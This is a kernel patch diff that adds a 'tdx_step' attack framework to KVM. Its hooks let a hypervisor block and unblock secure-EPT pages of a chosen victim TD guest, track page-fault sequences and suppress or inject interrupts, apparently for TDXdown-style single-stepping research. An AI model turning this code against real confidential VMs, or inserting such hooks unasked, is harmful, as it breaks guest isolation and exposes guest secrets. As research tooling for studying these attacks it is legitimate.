@@ -1,0 +1,2283 @@
+diff --git a/.gitignore b/.gitignore
+index 3f1a6bc1b..ebf4bbd2c 100644
+--- a/.gitignore
++++ b/.gitignore
+@@ -176,10 +176,3 @@ update-version-dkms
+ scripts/ubuntu-retpoline-extract-one
+ tools/hv/hv_kvp_daemon.8
+ tools/hv/lsvmbus.8
+-ubuntu/Kconfig
+-ubuntu/Makefile
+-ubuntu/include/Kbuild
+-ubuntu/include/README
+-ubuntu/ubuntu-host/Kconfig
+-ubuntu/ubuntu-host/Makefile
+-ubuntu/ubuntu-host/ubuntu-host.c
+diff --git a/arch/x86/include/asm/shared/tdx.h b/arch/x86/include/asm/shared/tdx.h
+index efd45396d..6fd78cc70 100644
+--- a/arch/x86/include/asm/shared/tdx.h
++++ b/arch/x86/include/asm/shared/tdx.h
+@@ -98,6 +98,20 @@ struct tdx_module_args {
+ 	u64 rsi;
+ };
+ 
++union tdx_ex_ret {
++	struct tdx_module_args regs;
++	/* Functions that walk SEPT */
++	struct {
++		u64 septe;
++		struct {
++			u64 level		:3;
++			u64 sept_reserved_0	:5;
++			u64 state		:8;
++			u64 sept_reserved_1	:48;
++		};
++	} sept_walk;
++};
++
+ /* Used to communicate with the TDX module */
+ u64 __tdcall(u64 fn, struct tdx_module_args *args);
+ u64 __tdcall_ret(u64 fn, struct tdx_module_args *args);
+diff --git a/arch/x86/kvm/Makefile b/arch/x86/kvm/Makefile
+index 44b0594da..bf20748bb 100644
+--- a/arch/x86/kvm/Makefile
++++ b/arch/x86/kvm/Makefile
+@@ -12,7 +12,7 @@ include $(srctree)/virt/kvm/Makefile.kvm
+ kvm-y			+= x86.o emulate.o i8259.o irq.o lapic.o \
+ 			   i8254.o ioapic.o irq_comm.o cpuid.o pmu.o mtrr.o \
+ 			   debugfs.o mmu/mmu.o mmu/page_track.o \
+-			   mmu/spte.o
++			   mmu/spte.o tdx_step.o
+ 
+ kvm-$(CONFIG_X86_64) += mmu/tdp_iter.o mmu/tdp_mmu.o
+ kvm-$(CONFIG_KVM_HYPERV) += hyperv.o
+diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
+index 76576f9e9..fec9cdf1c 100644
+--- a/arch/x86/kvm/mmu/mmu.c
++++ b/arch/x86/kvm/mmu/mmu.c
+@@ -6838,6 +6838,7 @@ void kvm_mmu_slot_try_split_huge_pages(struct kvm *kvm,
+ 	 * SPTEs.
+ 	 */
+ }
++EXPORT_SYMBOL(kvm_mmu_slot_try_split_huge_pages);
+ 
+ static bool kvm_mmu_zap_collapsible_spte(struct kvm *kvm,
+ 					 struct kvm_rmap_head *rmap_head,
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.c b/arch/x86/kvm/mmu/tdp_mmu.c
+index d55b61853..2fcbb8acc 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.c
++++ b/arch/x86/kvm/mmu/tdp_mmu.c
+@@ -11,6 +11,10 @@
+ #include <asm/cmpxchg.h>
+ #include <trace/events/kvm.h>
+ 
++
++#include "asm/pgtable_types.h"
++#include "linux/tdx_step.h"
++
+ /* Initializes the TDP MMU for the VM, if enabled. */
+ void kvm_mmu_init_tdp_mmu(struct kvm *kvm)
+ {
+@@ -1484,6 +1488,43 @@ static int tdp_mmu_link_sp(struct kvm *kvm, struct tdp_iter *iter,
+ static int tdp_mmu_split_huge_page(struct kvm *kvm, struct tdp_iter *iter,
+ 				   struct kvm_mmu_page *sp, bool shared);
+ 
++
++// helper functions for tracking logic
++
++static bool gpa_in_array(uint64_t* gpas, uint64_t len, uint64_t want_gfn) {
++	uint64_t idx;
++	for( idx = 0; idx < len; idx++ ) {
++		if( gpas[idx] == (want_gfn << 12) ) {
++			return true;
++		}
++	}
++	return false;
++}
++
++static bool track_gpas_in_array(struct kvm* kvm, uint64_t* gpas, uint64_t len) {
++	uint64_t idx;
++	for( idx = 0; idx < len; idx++ ) {
++		if(!my_tdx_sept_zap_private_spte_fnptr( kvm, gpas[idx] >> 12, PG_LEVEL_4K, false )) {
++			printk("%s: FAILED to block gpa 0x%llx at idx %llu\n", __FUNCTION__, gpas[idx], idx);
++			return false;
++		}
++	}
++	return true;
++}
++
++static bool untrack_gpas_in_array(struct kvm_vcpu* vcpu, uint64_t* gpas, uint64_t len) {
++	uint64_t idx;
++	for( idx = 0; idx < len; idx++ ) {
++		if(!my_tdx_sept_unzap_private_spte_fnptr( vcpu, gpas[idx] >> 12, PG_LEVEL_4K, false )) {
++			printk("%s: FAILED to unblock gpa 0x%llx at idx %llu\n", __FUNCTION__, gpas[idx], idx);
++			return false;
++		}
++	}
++	return true;
++}
++
++
++
+ /*
+  * Handle a TDP page fault (NPT/EPT violation/misconfiguration) by installing
+  * page tables and SPTEs to translate the faulting guest physical address.
+@@ -1496,7 +1537,16 @@ int kvm_tdp_mmu_map(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)
+ 	struct kvm_mmu_page *sp;
+ 	gfn_t raw_gfn;
+ 	bool is_private = fault->is_private && kvm_gfn_shared_mask(kvm);
++	/* From TDXdown, not check with this kernel.
++	 * Looks like fault->exec is buggy for TDX, as we only ever get write faults, 
++	 * event wehen tracking code pages. In `tdx.c` we  
++	 * compute `last_fault_exec` based on the
++	 * extended TDEXIT info. Results look correct so far
++	*/
++	bool my_is_exec = tdx_step_config.attack_cfg.last_fault_exec;
+ 	int ret = RET_PF_RETRY;
++	LOG_IF_TARGET_GPA(fault->gfn << 12);
++
+ 
+ 	kvm_mmu_hugepage_adjust(vcpu, fault);
+ 
+@@ -1504,6 +1554,263 @@ int kvm_tdp_mmu_map(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)
+ 
+ 	rcu_read_lock();
+ 
++
++	if( vcpu->kvm->userspace_pid == tdx_step_config.victim_vm_pid) {
++		if (((tdx_step_config.attack_cfg.state > AS_SETUP_PENDING) &&
++			(tdx_step_config.attack_cfg.state < AS_MAX))) {
++			//shorthand
++			attack_cfg_t *acfg = &tdx_step_config.attack_cfg;
++			TDXSTEP_MMU_LOG_DBG("%s:%d [%s] tdx step fault handler: attack_state=%d, gfn=0x%llx exec=%d, write=%d, read=%d, is_tdp=%d,private=%d\n",
++				__FILE__, __LINE__, __FUNCTION__,
++				acfg->state, fault->gfn,
++				my_is_exec, tdx_step_config.attack_cfg.last_fault_write, tdx_step_config.attack_cfg.last_fault_read,  fault->is_tdp,
++				fault->is_private);
++			
++			//waiting for next entry from trigger sequence and got hit -> advance to next entry in sequence but STAY in same state
++			if( (acfg->state == AS_WAITING_FOR_TARGET) && (fault->gfn ==(acfg->target_trigger_sequence[acfg->tts_idx] >> 12)) ) {
++				TDXSTEP_MMU_LOG_DBG("%s:%d AS_WAITING_FOR_TARGET, sequence idx %llu, len=%llu\n", __FILE__, __LINE__, acfg->tts_idx, acfg->target_trigger_sequence_len); 
++
++				//got hit but are not at attack poisition in our sequence -> advance sequence
++				if( acfg->tts_idx <  acfg->tts_attack_pos ) {
++					TDXSTEP_MMU_LOG_DBG("%s:%d tracking 0x%llx\n",__FILE__, __LINE__, acfg->target_trigger_sequence[acfg->tts_idx+1]);
++					//untrack currently tracked
++					my_tdx_sept_unzap_private_spte_fnptr(
++						vcpu,
++						acfg->target_trigger_sequence[acfg->tts_idx] >> 12,
++						PG_LEVEL_4K, false
++					);
++
++					//track next element
++					my_tdx_sept_zap_private_spte_fnptr(
++						vcpu->kvm,
++						acfg->target_trigger_sequence[acfg->tts_idx+1] >> 12,
++						PG_LEVEL_4K, false
++					);
++
++					acfg->tts_idx += 1;	
++					rcu_read_unlock();
++					return RET_PF_FIXED;
++				} else if(acfg->tts_idx == acfg->tts_attack_pos){ //got hit for attack target
++					//uint64_t tracked_count;
++			
++					TDXSTEP_MMU_LOG_DBG("%s:%d [%s] finished trigger sequence. Untracking \"target gpa\" 0x%llx and tracking \"done marker\" 0x%llx\n",
++						__FILE__, __LINE__, __FUNCTION__, acfg->target_gpa, acfg->done_marker_gpa);
++
++					//untrack target_gpa
++					my_tdx_sept_unzap_private_spte_fnptr(
++						vcpu,
++						acfg->target_gpa >> 12,
++						PG_LEVEL_4K, false);
++
++					//printk("%s:%d [%s] unzapped target_gpa. tracking all (this might take some time)\n", __FILE__, __LINE__, __FUNCTION__);
++
++					//track all
++					//tracked_count = kvm_start_tracking_fnptr(vcpu);
++					//printk("%s:%d [%s] tracked %llu pages\n", __FILE__, __LINE__, __FUNCTION__, tracked_count - 2);
++					my_tdx_sept_zap_private_spte_fnptr(
++						vcpu->kvm,
++						acfg->done_marker_gpa >> 12,
++						PG_LEVEL_4K, false
++					);
++					//untrack attack_phase_allowed_gpas
++					if(!untrack_gpas_in_array(vcpu,acfg->attack_phase_allowed_gpas, acfg->attack_phase_allowed_gpas_len)) {
++						printk("%s:%d failed to untrack attack_phase_allowed_gpas", __FILE__, __LINE__);
++					}
++					
++					//untrack ignored_gpas, if there are any
++					if (acfg->ignored_gpas != NULL) {
++						if(!untrack_gpas_in_array(vcpu, acfg->ignored_gpas, acfg->ignored_gpas_len)) {
++							printk("%s:%d error untracking \"ignored_gpas\"", __FILE__, __LINE__);
++						}
++					}
++
++					acfg->state = AS_WAITING_FOR_DONE_MARKER;
++					acfg->unrelated_faults_used_len = 0;
++					rcu_read_unlock();
++					return RET_PF_FIXED;
++				} else {
++					printk("%s:%d \n####\nAS_WAITING_FOR_TARGET WITH INVALID idx\n####\n", __FILE__, __LINE__);
++				}
++			} else if (acfg->state == AS_WAITING_FOR_DONE_MARKER) { //currently stepping
++				if (fault->gfn ==(acfg->done_marker_gpa >> 12)) { //got done marker -> end attack
++					uint64_t untracked_count, unrelated_faults_max_len;
++					int i;
++					TDXSTEP_MMU_LOG_DBG("%s:%d hit done_marker_gpa,\n", __FILE__, __LINE__);
++
++
++					//TODO: add new store mechanism
++					//store_cache_attack_results();
++
++					unrelated_faults_max_len = sizeof(acfg->unrelated_faults)/sizeof(acfg->unrelated_faults[0]);
++					my_tdx_sept_unzap_private_spte_fnptr(vcpu, acfg->done_marker_gpa >> 12 , PG_LEVEL_4K, false);
++					untracked_count = kvm_stop_tracking_fnptr(vcpu);
++					TDXSTEP_MMU_LOG_DBG("untracked %llu pages\n", untracked_count);
++
++					//convenience print to easily import the "unrelated_faults" faults into the attack tool
++					TDXSTEP_MMU_LOG_DBG("unrelated faults: ");
++					for( i = 0; (i < acfg->unrelated_faults_used_len) && (i < unrelated_faults_max_len) ;i++) {
++						if( i == (acfg->unrelated_faults_used_len-1)) {
++							TDXSTEP_MMU_LOG_DBG(KERN_CONT "0x%llx\n", acfg->unrelated_faults[i]);
++						} else {
++							TDXSTEP_MMU_LOG_DBG(KERN_CONT "0x%llx,", acfg->unrelated_faults[i]);
++						}
++					}
++
++					//
++					// Setup transfer to next state: update tts_idx and track next element from sequence
++					//
++
++					acfg->tts_idx += 1;
++					if( acfg->target_trigger_sequence[acfg->tts_idx] == acfg->done_marker_gpa) {
++						TDXSTEP_MMU_LOG_DBG("%s:%d cur_idx = %llu:, acfg->done_marker coincides with next gpa, advancing one more\n",__FILE__, __LINE__, acfg->tts_idx);
++						acfg->tts_idx += 1;
++					}
++
++					TDXSTEP_MMU_LOG_DBG("%s:%d tracking gpa 0x%llx for transition to AS_WAITING_FOR_END_OF_SEQ\n", __FILE__, __LINE__,
++						acfg->target_trigger_sequence[acfg->tts_idx]);
++
++					my_tdx_sept_zap_private_spte_fnptr(
++						vcpu->kvm,
++						acfg->target_trigger_sequence[acfg->tts_idx] >> 12,
++						PG_LEVEL_4K, false
++					);
++					
++
++					acfg->state = AS_WAITING_FOR_END_OF_SEQ;
++				} else { //unexpected  fault page during attack.
++					uint64_t untracked_count;
++
++					if (!my_is_exec) {
++						uint64_t unrelated_faults_max_len = sizeof(acfg->unrelated_faults)/sizeof(acfg->unrelated_faults[0]);
++						TDXSTEP_MMU_LOG_DBG("unrelated access is NOT EXEC. unblocking and allowing to continue\n");
++						my_tdx_sept_unzap_private_spte_fnptr(
++							vcpu, fault->gfn,
++							PG_LEVEL_4K, false);
++
++						TDXSTEP_MMU_LOG_DBG("unblock done!\n");
++						if( acfg->unrelated_faults_used_len < unrelated_faults_max_len) {
++							acfg->unrelated_faults[acfg->unrelated_faults_used_len] = fault->gfn << 12;
++							acfg->unrelated_faults_used_len += 1;
++						} else {
++							TDXSTEP_MMU_LOG_DBG("\n#####\noverflow in acfg->unrelated_faults\n#####\n");
++						}
++
++						rcu_read_unlock();
++						return RET_PF_FIXED;
++					}
++					//if we are here, we have exec fault to page that does not belong to our target
++					//setup tracking to detect when we re enter target
++
++					//untrack all pages
++					TDXSTEP_MMU_LOG_INFO("\n#####\n EXEC to unrelated blocked page -> pausing attack\n#####\n");
++					untracked_count = kvm_stop_tracking_fnptr(vcpu);
++					TDXSTEP_MMU_LOG_DBG("untracked %llu pages\n", untracked_count);
++
++					//track code page again and change state to AS_WAITING_FOR_REENTER
++					//printk("calling my_zap_private_spte on code_gfn=0x%llx\n", acfg->code_gpa >> 12);
++
++					if( track_gpas_in_array(vcpu->kvm, acfg->attack_phase_allowed_gpas, acfg->attack_phase_allowed_gpas_len)) {
++						TDXSTEP_MMU_LOG_DBG("setting attack state to AS_WAITING_FOR_REENTER\n");
++						acfg->state = AS_WAITING_FOR_REENTER;
++					} else {
++						printk("failed to block target_gfn, setting state to AS_TEARDOWN_PENDING\n");
++						acfg->state = AS_TEARDOWN_PENDING;
++					}
++				}
++				rcu_read_unlock();
++				return RET_PF_FIXED;
++			} else if ((acfg->state == AS_WAITING_FOR_END_OF_SEQ) && (fault->gfn == (acfg->target_trigger_sequence[acfg->tts_idx] >> 12))) { 
++					//carried out attack against target. Process reamining entries in  sequence
++					// so that we end up in a state, where we can easily track the next sign call
++
++					
++					TDXSTEP_MMU_LOG_DBG("%s:%d AS_WAITING_FOR_END_OF_SEQ, sequence idx %llu, len=%llu\n", __FILE__, __LINE__, acfg->tts_idx, acfg->target_trigger_sequence_len); 
++					
++					
++					//untrack current
++					my_tdx_sept_unzap_private_spte_fnptr(
++						vcpu,
++						acfg->target_trigger_sequence[acfg->tts_idx] >> 12,
++						PG_LEVEL_4K,
++						false
++					);
++					
++					//not at end of sequence -> track next element
++					if( acfg->tts_idx < (acfg->target_trigger_sequence_len-1)) {
++						acfg->tts_idx += 1;
++						/*printk("AS_WAITING_FOR_END_OF_SEQ: tracking gfn 0x%llx\n",
++							acfg->target_trigger_sequence[acfg->tts_idx] >> 12
++						);*/
++						my_tdx_sept_zap_private_spte_fnptr(
++							vcpu->kvm,
++							acfg->target_trigger_sequence[acfg->tts_idx] >> 12,
++							PG_LEVEL_4K,
++							false
++						);
++					} else { //got hit for last element -> advance to next state
++						uint64_t untracked_count;
++						//update state
++						TDXSTEP_MMU_LOG_DBG("AS_WAITING_FOR_END_OF_SEQ: got hit for final element, transitioning to AS_INJECT_PENDING_INTR\n");
++						untracked_count = kvm_stop_tracking_fnptr(vcpu);
++						TDXSTEP_MMU_LOG_DBG("untracked %llu pages\n", untracked_count);
++						acfg->state = AS_INJECT_PENDING_INTR;
++					}
++
++					rcu_read_unlock();
++					return RET_PF_FIXED;
++				} else if (acfg->state == AS_WAITING_FOR_REENTER) {
++				if (gpa_in_array(acfg->attack_phase_allowed_gpas, acfg->attack_phase_allowed_gpas_len, fault->gfn)) {
++					bool success = true;
++					TDXSTEP_MMU_LOG_INFO("%s:%d [%s] in state AS_WAITING_FOR_REENTER and got hit on code_gpa=0x%llx, re-starting atack\n",
++						__FILE__, __LINE__, __FUNCTION__, fault->gfn << 12);
++
++					//track all pages but code_gpa  and switch to AS_WAITING_FOR_DONE_MARKER state
++					kvm_start_tracking_fnptr(vcpu);
++					if( !untrack_gpas_in_array(vcpu, acfg->attack_phase_allowed_gpas, acfg->attack_phase_allowed_gpas_len)) {
++						printk("%s:%d error untracking attack phase GPAs\n", __FILE__, __LINE__);
++						acfg->state = AS_TEARDOWN_PENDING;
++						success = false;
++					}
++					if (acfg->ignored_gpas != NULL) {
++						if( !untrack_gpas_in_array(vcpu, acfg->ignored_gpas, acfg->ignored_gpas_len)) {
++							printk("%s:%d error untracking ignored GPAs\n", __FILE__, __LINE__);
++							acfg->state = AS_TEARDOWN_PENDING;
++							success = false;
++						}
++					}
++
++					if(success) {
++						acfg->state = AS_WAITING_FOR_DONE_MARKER;
++					}
++
++					rcu_read_unlock();
++					return RET_PF_FIXED;
++				} else {
++					if( is_valid_is_gfn_blocked_index(fault->gfn) ) {
++						printk("%s:%d [%s] state: AS_WAITING_FOR_REENTER, unexpected gfn: 0x%llx, stored tracking_state: %d\n", __FILE__, __LINE__, __FUNCTION__,
++							fault->gfn,is_gfn_blocked[fault->gfn]);
++					} else {
++						printk("%s:%d [%s] state: AS_WAITING_FOR_REENTER, unexpected gfn: 0x%llx, NO TRACKING STATE DATA\n", __FILE__, __LINE__, __FUNCTION__,
++							fault->gfn);
++					}
++					
++					if (is_valid_is_gfn_blocked_index(fault->gfn) && is_gfn_blocked[fault->gfn]) {
++						printk("%s:%d [%s] state: AS_WAITING_FOR_REENTER, unexpected gfn 0x%llx\n",__FILE__, __LINE__, __FUNCTION__, fault->gfn);
++						my_tdx_sept_unzap_private_spte_fnptr(
++							vcpu, fault->gfn,
++							PG_LEVEL_4K, false
++						);
++						rcu_read_unlock();
++						return RET_PF_FIXED;
++					}
++				}
++			}
++			//if we are here, the fault should not be due to any of our tracking
++			//do nothing and let normal page fault code handle stuff
++			TDXSTEP_MMU_LOG_DBG("%s:%d [%s] no special handling required\n", __FILE__,
++				__LINE__, __FUNCTION__);
++		}
++	}
+ 	raw_gfn = gpa_to_gfn(fault->addr);
+ 
+ 	if (is_error_noslot_pfn(fault->pfn) ||
+diff --git a/arch/x86/kvm/tdx_step.c b/arch/x86/kvm/tdx_step.c
+new file mode 100644
+index 000000000..56422b142
+--- /dev/null
++++ b/arch/x86/kvm/tdx_step.c
+@@ -0,0 +1,112 @@
++#include "linux/export.h"
++#include <linux/tdx_step.h>
++#include <linux/module.h>
++#include <asm/apic.h>
++#include <asm-generic/set_memory.h>
++#include <asm/atomic.h>
++#include <linux/kvm_host.h>
++
++
++#define TRACKED_VMS_CAP  10
++extern my_vm_state_t tracked_vms[TRACKED_VMS_CAP];
++
++
++atomic_t t_mode;
++EXPORT_SYMBOL(t_mode);
++
++tdx_step_config_t tdx_step_config = {
++	.victim_vm_pid = -1,
++	.mapping_shared_mem = NULL,
++	.pinned_page_shared_mem = NULL,
++	.attack_cfg = {
++		.state = AS_INACTIVE,
++		.step_counts = NULL,
++	},
++	.suppressed_interrupt_during_stepping = false,
++};
++EXPORT_SYMBOL(tdx_step_config);
++
++DEFINE_SPINLOCK(tdx_step_config_lock);
++EXPORT_SYMBOL(tdx_step_config_lock);
++
++DEFINE_SPINLOCK(tdx_step_inside_vm_lock);
++EXPORT_SYMBOL(tdx_step_inside_vm_lock);
++
++atomic_t tdx_step_inside_vm = ATOMIC_INIT(0);
++EXPORT_SYMBOL(tdx_step_inside_vm);
++
++//FIXME: re-evaluate if these really need to be exported (see also tdx_step.h header)
++//maps gfn to block status (1=blocked, 0=unblocked); might be null before first call to is_gfn_blocked
++tdx_step_block_status_t *is_gfn_blocked = NULL;
++EXPORT_SYMBOL(is_gfn_blocked);
++
++uint64_t max_gfn_is_gfn_blocked = 0;
++EXPORT_SYMBOL(max_gfn_is_gfn_blocked);
++
++zap_fnptr_t my_tdx_sept_zap_private_spte_fnptr = NULL;
++EXPORT_SYMBOL(my_tdx_sept_zap_private_spte_fnptr);
++unzap_fnptr_t my_tdx_sept_unzap_private_spte_fnptr = NULL;
++EXPORT_SYMBOL(my_tdx_sept_unzap_private_spte_fnptr);
++start_stop_track_all_fnptr_t kvm_start_tracking_fnptr = NULL;
++EXPORT_SYMBOL(kvm_start_tracking_fnptr);
++start_stop_track_all_fnptr_t kvm_stop_tracking_fnptr = NULL;
++EXPORT_SYMBOL(kvm_stop_tracking_fnptr);
++my_split_fnptr_t my_split_all_pages_fnptr;
++EXPORT_SYMBOL(my_split_all_pages_fnptr);
++
++bool is_gfn_blocked_or_uninit(uint64_t gfn)
++{
++	if (is_gfn_blocked == NULL) {
++		return true;
++	}
++	if ((gfn < 0) || (gfn > max_gfn_is_gfn_blocked)) {
++		printk("%s out of bounds gfn 0x%llx\n", __FUNCTION__, gfn);
++		return true;
++	}
++	return (is_gfn_blocked[gfn] == BS_UNINIT ||
++		is_gfn_blocked[gfn] == BS_BLOCKED);
++}
++EXPORT_SYMBOL(is_gfn_blocked_or_uninit);
++
++bool is_valid_is_gfn_blocked_index(uint64_t gfn)
++{
++	if (is_gfn_blocked == NULL) {
++		return false;
++	}
++	if ((gfn < 0) || (gfn > max_gfn_is_gfn_blocked)) {
++		printk("%s out of bounds gfn 0x%llx\n", __FUNCTION__, gfn);
++		return false;
++	}
++	return true;
++}
++EXPORT_SYMBOL(is_valid_is_gfn_blocked_index);
++
++bool is_gfn_allowed_or_uninit(uint64_t gfn)
++{
++	if (is_gfn_blocked == NULL) {
++		return true;
++	}
++	if ((gfn < 0) || (gfn > max_gfn_is_gfn_blocked)) {
++		printk("%s out of bounds gfn 0x%llx\n", __FUNCTION__, gfn);
++		return true;
++	}
++	return (is_gfn_blocked[gfn] == BS_UNINIT ||
++		is_gfn_blocked[gfn] == BS_ALLOWED);
++}
++EXPORT_SYMBOL(is_gfn_allowed_or_uninit);
++
++
++my_vm_state_t* get_vm(int pid) {
++	int i;
++	for( i = 0; i < TRACKED_VMS_CAP; i++) {
++		if(tracked_vms[i].valid && tracked_vms[i].kvm->userspace_pid == pid) {
++			return tracked_vms+i;
++		}
++	}
++	return NULL;
++}
++
++attack_state_t get_attack_state(void) {
++	return tdx_step_config.attack_cfg.state;
++}
++EXPORT_SYMBOL(get_attack_state);
+\ No newline at end of file
+diff --git a/arch/x86/kvm/vmx/common.h b/arch/x86/kvm/vmx/common.h
+index 787f59c44..d163ccdd9 100644
+--- a/arch/x86/kvm/vmx/common.h
++++ b/arch/x86/kvm/vmx/common.h
+@@ -11,6 +11,8 @@
+ #include "vmcs.h"
+ #include "x86.h"
+ 
++#include <linux/tdx_step.h>
++
+ extern unsigned long vmx_host_idt_base;
+ void vmx_do_interrupt_irqoff(unsigned long entry);
+ void vmx_do_nmi_irqoff(void);
+@@ -151,6 +153,20 @@ static inline void kvm_vcpu_trigger_posted_interrupt(struct kvm_vcpu *vcpu,
+ static inline void __vmx_deliver_posted_interrupt(struct kvm_vcpu *vcpu,
+ 						  struct pi_desc *pi_desc, int vector)
+ {
++
++	/*spin_lock(&tdx_step_config_lock);
++	if( tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid) {
++		spin_unlock(&tdx_step_config_lock);
++		printk("%s:%d [%s] blocking injection of vector=0x%x\n",
++			__FILE__,
++			__LINE__,
++			__FUNCTION__,
++			vector
++		);
++		return;
++	} else {
++		spin_unlock(&tdx_step_config_lock);
++	}*/
+ 	if (pi_test_and_set_pir(vector, pi_desc))
+ 		return;
+ 
+diff --git a/arch/x86/kvm/vmx/tdx.c b/arch/x86/kvm/vmx/tdx.c
+index 4f7beeadc..2b49b4d14 100644
+--- a/arch/x86/kvm/vmx/tdx.c
++++ b/arch/x86/kvm/vmx/tdx.c
+@@ -1,4 +1,5 @@
+ // SPDX-License-Identifier: GPL-2.0
++#include "linux/spinlock.h"
+ #include <linux/cpu.h>
+ #include <linux/mmu_context.h>
+ 
+@@ -17,6 +18,8 @@
+ #include <trace/events/kvm.h>
+ #include "trace.h"
+ 
++#include <linux/tdx_step.h>
++
+ #undef pr_fmt
+ #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+ 
+@@ -893,6 +896,8 @@ static noinstr void tdx_vcpu_enter_exit(struct vcpu_tdx *tdx)
+ 
+ 	guest_state_enter_irqoff();
+ 
++
++
+ 	/*
+ 	 * TODO: optimization:
+ 	 * - Eliminate copy between args and vcpu->arch.regs.
+@@ -945,6 +950,27 @@ static noinstr void tdx_vcpu_enter_exit(struct vcpu_tdx *tdx)
+ 		kvm_after_interrupt(vcpu);
+ 	}
+ 	guest_state_exit_irqoff();
++
++	if (tdx->vcpu.kvm->userspace_pid == tdx_step_config.victim_vm_pid && tdexit_gpa(vcpu) != 0) {
++		spin_lock(&tdx_step_config_lock);
++		//Table 28-7 "Exit Qualification for EPT Violation" in Intel SDM documents the "Exit Qualification field"
++		tdx_step_config.attack_cfg.last_fault_exec = tdexit_exit_qual(vcpu) & (0x1ULL << 2);
++		tdx_step_config.attack_cfg.last_fault_write = tdexit_exit_qual(vcpu) & (0x1ULL << 1);
++		tdx_step_config.attack_cfg.last_fault_read = tdexit_exit_qual(vcpu) & (0x1ULL << 0);
++
++		if (tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER) {
++			TDXSTEP_LOG_DBG("%s:%d [%s] exit with nonzero gpa field during attack: basic exit, exit qualifiction = 0x%lx, extended exit qualification = 0x%lx, exit_gpa=0x%lx\n",
++			       __FILE__, __LINE__, __FUNCTION__,
++			       tdexit_exit_qual(vcpu),
++			       tdexit_ext_exit_qual(vcpu), tdexit_gpa(vcpu));
++			//we handle the fault in the regular fault handler in mmu.c
++		}
++		spin_unlock(&tdx_step_config_lock);
++	}
++
++
++
++
+ }
+ struct OutData {
+   void *vcpu;
+@@ -960,6 +986,7 @@ struct OutData {
+   struct list_head *mmu;
+   struct list_head *mmu_roots;
+   uint64_t tdvpr_pa;
++  int vm_pid;
+ };
+ void (* volatile vcpu_run_beg_hook)(struct OutData *) = 0;
+ EXPORT_SYMBOL_GPL(vcpu_run_beg_hook);
+@@ -971,6 +998,66 @@ fastpath_t tdx_vcpu_run(struct kvm_vcpu *vcpu)
+ {
+ 	struct vcpu_tdx *tdx = to_tdx(vcpu);
+ 
++	//td_state_non_arch_read64(tdx, TD_VCPU_STATE_DETAILS_NON_ARCH)
++	spin_lock(&tdx_step_config_lock);
++	if( tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid) {
++		union tdx_vcpu_state_details details;
++		spin_unlock(&tdx_step_config_lock);
++		details.full = td_state_non_arch_read64(tdx, TD_VCPU_STATE_DETAILS_NON_ARCH);
++		if( details.vmxip ) {
++			printk("%s:%d [%s] TD has pending virtual interrupt\n",
++				__FILE__,
++				__LINE__,
++				__FUNCTION__
++			);
++		}
++	} else {
++		spin_unlock(&tdx_step_config_lock);
++	}
++
++	spin_lock(&tdx_step_config_lock);
++	if (tdx->vcpu.kvm->userspace_pid == tdx_step_config.victim_vm_pid && tdx_step_config.attack_cfg.state == AS_SETUP_PENDING) {
++		bool blocked_target;
++		uint64_t gfn = tdx_step_config.attack_cfg.target_trigger_sequence[0] >> 12;
++		if( tdx_step_config.attack_cfg.current_attack_iteration_idx == 0) {
++			tdx_step_config.attack_cfg.start_time = ktime_get_ns();
++		}
++		TDXSTEP_LOG_DBG("calling my_zap_private_spte on first trigger sequence entry gfn  0x%llx\n", gfn);
++		blocked_target = my_tdx_sept_zap_private_spte(vcpu->kvm, gfn, PG_LEVEL_4K, false);
++		if (blocked_target) {
++			TDXSTEP_LOG_DBG("setting attack state to AS_WAITING_FOR_TARGET\n");
++			tdx_step_config.attack_cfg.state = AS_WAITING_FOR_TARGET;
++		} else {
++			TDXSTEP_LOG_DBG("failed to block target_gfn, setting state to AS_INACTIVE\n");
++			tdx_step_config.attack_cfg.state = AS_INACTIVE;
++		}
++	}
++	spin_unlock(&tdx_step_config_lock);
++
++	if(tdx_step_config.attack_cfg.state == AS_INJECT_PENDING_INTR && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid) {
++		printk("%s:%d kicking VM\n", __FILE__, __LINE__);
++		tdx_deliver_interrupt(vcpu->arch.apic,0, 0,0xec );
++	}
++
++	/*if(tdx_step_config.suppressed_interrupt_during_stepping && tdx_step_config.attack_cfg.state != AS_WAITING_FOR_DONE_MARKER && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid
++		) {
++
++		struct kvm_lapic *apic = vcpu->arch.apic;
++		printk("%s:%d [%s] Injecting suppressed interrupt: delivery_mode=0x%x, trig_mode=0x%x, vector=0x%x\n",
++			__FILE__,
++			__LINE__,
++			__FUNCTION__,
++			tdx_step_config.suppressed_interrupt_delivery_mode, 
++			tdx_step_config.suppressed_interrupt_trig_mode,
++			tdx_step_config.suppressed_interrupt_vector
++		);
++		tdx_deliver_interrupt(apic,
++			tdx_step_config.suppressed_interrupt_delivery_mode, 
++			tdx_step_config.suppressed_interrupt_trig_mode,
++			tdx_step_config.suppressed_interrupt_vector
++		);
++		tdx_step_config.suppressed_interrupt_during_stepping = false;
++	}*/
+ 	
+ 
+ 	if (unlikely(!tdx->initialized))
+@@ -982,7 +1069,7 @@ fastpath_t tdx_vcpu_run(struct kvm_vcpu *vcpu)
+ 
+ 	trace_kvm_entry(vcpu);
+ 
+-	if (pi_test_on(&tdx->pi_desc)) {
++	if (pi_test_on(&tdx->pi_desc) && !(tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid) ) {
+ 		apic->send_IPI_self(POSTED_INTR_VECTOR);
+ 
+ 		kvm_wait_lapic_expire(vcpu);
+@@ -1003,10 +1090,32 @@ fastpath_t tdx_vcpu_run(struct kvm_vcpu *vcpu)
+ 			&vcpu->kvm->arch.active_mmu_pages,
+ 			&vcpu->kvm->arch.tdp_mmu_roots,
+ 			tdx->tdvpr_pa,
++			vcpu->kvm->userspace_pid,
+ 		};
+ 		vcpu_run_beg_hook(&d);
+ 	}
